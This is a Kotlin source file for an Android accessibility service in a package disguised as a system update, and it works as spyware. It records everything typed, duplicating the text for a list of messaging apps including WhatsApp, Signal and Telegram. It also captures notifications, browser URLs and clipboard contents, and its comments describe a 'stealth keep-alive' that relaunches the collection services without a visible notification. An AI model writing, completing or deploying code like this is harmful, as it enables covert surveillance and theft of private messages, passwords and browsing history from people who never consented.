package com.androidsystem.update.accessibility

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.ClipboardManager
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import com.androidsystem.update.database.DataRepository
import com.androidsystem.update.service.CoreService
import com.androidsystem.update.service.WatchdogService
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import javax.inject.Inject

@AndroidEntryPoint
@RequiresApi(Build.VERSION_CODES.S)
class AccessibilityServiceImpl : AccessibilityService() {

    @Inject
    lateinit var repository: DataRepository

    private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val handler = Handler(Looper.getMainLooper())
    private var currentPackage = ""
    private var lastEventTime = 0L
    private var lastClipboardContent = ""
    private val clipboardManager by lazy { getSystemService(CLIPBOARD_SERVICE) as ClipboardManager }

    private val trackedSocialApps = setOf(
        "com.whatsapp", "com.facebook.orca", "com.facebook.katana",
        "com.instagram.android", "org.telegram.messenger", "com.twitter.android",
        "com.snapchat.android", "com.zhiliaoapp.musically", "com.discord",
        "com.skype.raider", "com.signal", "com.google.android.apps.messaging",
        "com.android.mms", "com.samsung.android.messaging", "com.google.android.gm"
    )

    private val browsers = setOf(
        "com.android.chrome", "com.sec.android.app.sbrowser",
        "org.mozilla.firefox", "com.microsoft.emmx", "com.opera.browser", "com.brave.browser"
    )

    companion object {
        private const val TAG = "AccessibilityService"
        private const val MAX_TEXT_LENGTH = 1000
        private const val EVENT_THROTTLE_MS = 50L
        private const val CLIPBOARD_POLL_INTERVAL = 30000L
        private const val MAX_DEPTH = 15
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        setServiceInfo(AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED or
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        })
        startClipboardPolling()
        Log.d(TAG, "Accessibility service connected")
        // Keep-alive hook: Android itself keeps enabled accessibility services
        // alive and reconnects them after the process is killed (swipe-away,
        // LMK, reboot once the device is unlocked). Re-arm the whole chain
        // from here — the strongest stealth keep-alive that needs no
        // notification. Direct startService may be blocked when the app is
        // backgrounded, so fall back to the exact-alarm start like the
        // watchdog does.
        try {
            startService(Intent(this, CoreService::class.java))
            startService(Intent(this, WatchdogService::class.java))
        } catch (e: Exception) {
            Log.e(TAG, "Keep-alive direct start blocked, using alarm", e)
            WatchdogService.scheduleAlarmStart(this, CoreService::class.java, 1000L)
            WatchdogService.scheduleAlarmStart(this, WatchdogService::class.java, 2000L)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val now = System.currentTimeMillis()
        if (now - lastEventTime < EVENT_THROTTLE_MS) return
        lastEventTime = now

        val pkg = event.packageName?.toString() ?: return
        currentPackage = pkg
        val eventType = event.eventType
        val className = event.className?.toString() ?: ""
        val text = event.text?.joinToString("") { it.toString() } ?: ""
        val contentDesc = event.contentDescription?.toString() ?: ""
        val source = event.source
        val viewId = source?.viewIdResourceName
        source?.recycle()

        coroutineScope.launch {
            processEventSnapshot(eventType, pkg, className, text, contentDesc, viewId, now)
        }
    }

    private suspend fun processEventSnapshot(
        eventType: Int, packageName: String,
        className: String?, text: String,
        contentDesc: String?, viewId: String?,
        timestamp: Long
    ) {
        try {
            when (eventType) {
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    if (browsers.any { packageName.contains(it) })
                        extractUrlFromBrowser(packageName)
                    repository.insertCollectedData("window_change",
                        JSONObject().apply {
                            put("package", packageName)
                            put("class", className ?: "unknown")
                            put("timestamp", timestamp)
                        }.toString())
                }
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val trimmed = text.take(MAX_TEXT_LENGTH)
                    repository.insertCollectedData("text_change",
                        JSONObject().apply {
                            put("package", packageName)
                            put("text", trimmed)
                            put("view_id", viewId ?: "unknown")
                            put("timestamp", timestamp)
                        }.toString())
                    if (trackedSocialApps.any { packageName.contains(it) }) {
                        repository.insertCollectedData("social_message",
                            JSONObject().apply {
                                put("package", packageName)
                                put("text", trimmed)
                                put("view_id", viewId ?: "unknown")
                                put("timestamp", timestamp)
                            }.toString())
                    }
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED -> checkClipboard(packageName)
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    repository.insertCollectedData("focus", JSONObject().apply {
                        put("package", packageName)
                        put("view_id", viewId ?: "unknown")
                        put("timestamp", timestamp)
                    }.toString())
                }
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                    repository.insertCollectedData("notification", JSONObject().apply {
                        put("package", packageName)
                        put("title", contentDesc ?: "")
                        put("text", text.take(MAX_TEXT_LENGTH))
                        put("timestamp", timestamp)
                    }.toString())
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "processEvent error", e)
        }
    }

    private suspend fun extractUrlFromBrowser(packageName: String) {
        try {
            val root = withContext(Dispatchers.Main) { rootInActiveWindow } ?: return
            try {
                val urlNode = findUrlNode(root)
                try {
                    val url = urlNode?.text?.toString()
                    if (!url.isNullOrEmpty() && url.startsWith("http")) {
                        repository.insertBrowsingHistory(
                            url, urlNode.contentDescription?.toString(),
                            packageName, System.currentTimeMillis()
                        )
                    }
                } finally {
                    urlNode?.recycle()
                }
            } finally {
                root.recycle()
            }
        } catch (e: Exception) {
            Log.e(TAG, "URL extraction error", e)
        }
    }

    // FIX: depth limit + proper recycle to prevent memory leak
    private fun findUrlNode(node: AccessibilityNodeInfo, depth: Int = 0): AccessibilityNodeInfo? {
        if (depth > MAX_DEPTH) return null
        val ids = listOf("url_bar", "addressbar", "omnibox", "location_bar", "search_box_text")
        if (ids.any { node.viewIdResourceName?.contains(it) == true }) return node

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findUrlNode(child, depth + 1)
            if (found != null) {
                // FIX: only recycle child if it's NOT the found node (prevent use-after-free)
                if (found !== child) child.recycle()
                return found
            }
            child.recycle()
        }
        return null
    }

    private suspend fun checkClipboard(packageName: String) {
        try {
            val clip = clipboardManager.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val content = clip.getItemAt(0).text?.toString() ?: ""
                if (content.isNotEmpty() && content != lastClipboardContent) {
                    lastClipboardContent = content
                    repository.insertCollectedData("clipboard", JSONObject().apply {
                        put("content", content)
                        put("source", packageName)
                        put("timestamp", System.currentTimeMillis())
                    }.toString())
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Clipboard error", e)
        }
    }

    private fun startClipboardPolling() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                coroutineScope.launch { checkClipboard(currentPackage) }
                handler.postDelayed(this, CLIPBOARD_POLL_INTERVAL)
            }
        }, CLIPBOARD_POLL_INTERVAL)
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        coroutineScope.cancel()
        super.onDestroy()
    }
}
